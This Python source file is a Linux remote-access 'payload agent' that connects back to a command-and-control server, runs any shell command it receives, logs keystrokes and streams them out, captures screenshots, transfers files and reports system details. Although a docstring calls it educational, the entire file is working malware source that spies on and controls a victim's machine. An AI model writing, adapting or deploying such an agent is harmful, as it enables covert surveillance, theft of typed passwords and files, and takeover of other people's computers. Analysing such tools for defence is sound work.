#!/usr/bin/python
"""
Linux Payload Agent
-------------------
This script serves as the client-side agent for the Remote Shell system.
It connects to a central server and executes commands, captures keystrokes,
and takes screenshots.

Educational Purpose Only:
This code is for learning about C2 (Command & Control) architectures and
defensive analysis. It contains no persistence mechanisms.
"""

import io
import socket
import threading
import time
import subprocess
import os
import sys
import platform
import json
import struct

# Third-party dependencies
try:
    from PIL import ImageGrab
    from pynput.keyboard import Key, Listener
except ImportError:
    print("[!] Missing dependencies. Attempting to install...")
    subprocess.call([sys.executable, "-m", "pip", "install", "Pillow", "pynput"])
    try:
        from PIL import ImageGrab
        from pynput.keyboard import Key, Listener
    except ImportError:
        print("[!] Failed to install dependencies. Exiting.")
        sys.exit(1)


class LinuxAgent:
    """
    Main agent class for handling server connection and command execution.
    """
    
    # Configuration
    SERVER_IP = '192.168.0.0'
    SERVER_PORT = 5555
    RECONNECT_DELAY = 10
    TIMEOUT_LIMIT = 15

    def __init__(self):
        self.server_socket = None
        self.keylogger_active = False
        self.active_keylogger_listener = False
        self.is_running = True
        self.timeout_counter = 0

    def connect(self):
        """
        Establishes a persistent connection to the C2 server.
        """
        while self.is_running:
            try:
                self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.server_socket.connect((self.SERVER_IP, self.SERVER_PORT))
                print(f"[+] Connected to {self.SERVER_IP}:{self.SERVER_PORT}")
                return True
            except (socket.error, TimeoutError):
                print(f'[!] Connection failed. Retrying in {self.RECONNECT_DELAY} seconds...')
                time.sleep(self.RECONNECT_DELAY)
            except Exception as e:
                print(f'[!] Critical error during connection: {e}')
                time.sleep(self.RECONNECT_DELAY)

    def run(self):
        """
        Main execution loop. Connects to server and starts command listener.
        """
        if self.connect():
            # Start the command listener in a separate thread
            command_thread = threading.Thread(target=self._command_listener)
            command_thread.daemon = True
            command_thread.start()

            # Main thread handles keylogging if activated
            self._main_loop()

    def _command_listener(self):
        """
        Continuously listens for commands from the server.
        """
        while self.is_running:
            try:
                command_data = self._receive_json()
                
                if not command_data:
                    self._handle_disconnect()
                    continue

                self._process_command(command_data)

            except Exception as e:
                print(f"[!] Error in command listener: {e}")
                self.is_running = False
                break

    def _process_command(self, command):
        """
        Parses and executes a single command from the server.
        """
        if command == 'quit':
            self.is_running = False
            return

        elif command == 'clear':
            return

        elif command.startswith('cd '):
            try:
                os.chdir(command[3:].strip())
            except OSError as e:
                self._send_json(f"Error changing directory: {e}")

        elif command == 'pwd':
            self._send_json(os.getcwd())

        elif command == 'ls':
            try:
                files = os.listdir()
                self._send_json('\n'.join(files))
            except Exception as e:
                self._send_json(f"Error listing directory: {e}")

        elif command.startswith('ls '):
            # Pass flags like -la directly
            self._execute_shell_command(command)

        elif command.startswith('cat '):
            self._execute_shell_command(command)

        elif command == 'keylog_start':
            if not self.keylogger_active:
                self.keylogger_active = True
                self.active_keylogger_listener = True
                print("[*] Keylogger started.")

        elif command == 'keylog_stop':
            self.keylogger_active = False
            print("[*] Keylogger stopped.")

        elif command.startswith('download '):
            self._upload_file(command[9:].strip())

        elif command.startswith('upload '):
            self._download_file(command[7:].strip())

        elif command == 'screenshot':
            self._take_screenshot()

        elif command == 'sysinfo':
            self._send_sys_info()

        else:
            # Execute arbitrary shell command
            self._execute_shell_command(command)

    def _execute_shell_command(self, command):
        """
        Executes a shell command and sends the output back to the server.
        """
        try:
            process = subprocess.Popen(
                command, 
                shell=True, 
                stdout=subprocess.PIPE, 
                stderr=subprocess.PIPE,
                stdin=subprocess.PIPE
            )
            stdout, stderr = process.communicate()
            result = (stdout + stderr).decode('utf-8', errors='replace')
            self._send_json(result)
        except Exception as e:
            self._send_json(f"Error executing command: {e}")

    def _main_loop(self):
        """
        Handles the keylogger listener when active.
        """
        while self.is_running:
            if self.active_keylogger_listener:
                # Start keylogger blocking call
                with Listener(on_press=self._capture_keys) as listener:
                    self.active_keylogger_listener = False # Reset flag so we don't restart listener
                    listener.join()
            else:
                time.sleep(1)

    def _capture_keys(self, key):
        """
        Callback for pynput listener. Sends keystrokes to server.
        """
        if not self.keylogger_active:
            return False  # Stop listener

        try:
            if key == Key.backspace:
                char = "<- "
            elif key == Key.space:
                char = " "
            elif key == Key.enter:
                char = "\n"
            elif hasattr(key, 'char'):
                char = key.char if key.char else str(key)
            else:
                char = str(key)

            self.server_socket.send(char.encode())
        except Exception as e:
            print(f"[!] Keylogger error: {e}")

    def _send_json(self, data):
        """Helper to send JSON data."""
        try:
            json_data = json.dumps(data)
            self.server_socket.send(json_data.encode())
        except Exception as e:
            print(f"[!] Send error: {e}")

    def _receive_json(self):
        """Helper to receive and decode JSON data."""
        received_data = ''
        while True:
            try:
                chunk = self.server_socket.recv(1024).decode()
                if not chunk:
                    return None # Connection closed
                received_data += chunk
                return json.loads(received_data)
            except json.JSONDecodeError:
                continue # Wait for more data
            except Exception:
                return None

    def _handle_disconnect(self):
        """Handles server disconnection logic."""
        self.timeout_counter += 1
        time.sleep(0.25)
        if self.timeout_counter >= self.TIMEOUT_LIMIT:
            self.is_running = False

    def _upload_file(self, filename):
        """Sends a local file to the server."""
        if not os.path.exists(filename):
            return # Or send error message
        
        try:
            with open(filename, 'rb') as f:
                self.server_socket.send(f.read())
        except Exception as e:
            print(f"[!] File upload error: {e}")

    def _download_file(self, filename):
        """Receives a file from the server."""
        try:
            with open(filename, 'wb') as f:
                self.server_socket.settimeout(1)
                while True:
                    try:
                        chunk = self.server_socket.recv(1024)
                        if not chunk:
                            break
                        f.write(chunk)
                    except socket.timeout:
                        break
            self.server_socket.settimeout(None)
        except Exception as e:
            print(f"[!] File download error: {e}")

    def _take_screenshot(self):
        """Captures and sends a screenshot using length-prefixed protocol."""
        try:
            screenshot = ImageGrab.grab()
            img_byte_arr = io.BytesIO()
            screenshot.save(img_byte_arr, format='PNG')
            img_bytes = img_byte_arr.getvalue()
            
            # Pack size as 4-byte big-endian integer
            size_header = struct.pack('>I', len(img_bytes))
            
            # Send size first, then data
            self.server_socket.sendall(size_header)
            self.server_socket.sendall(img_bytes)
            
        except Exception as e:
            print(f"[!] Screenshot error: {e}")

    def _send_sys_info(self):
        """Sends system information."""
        uname = platform.uname()
        info = f"""
        Platform: {uname.system}
        Release: {uname.release}
        Version: {uname.version}
        Architecture: {uname.machine}
        Hostname: {uname.node}
        """
        self._send_json(info)


if __name__ == "__main__":
    agent = LinuxAgent()
    agent.run()
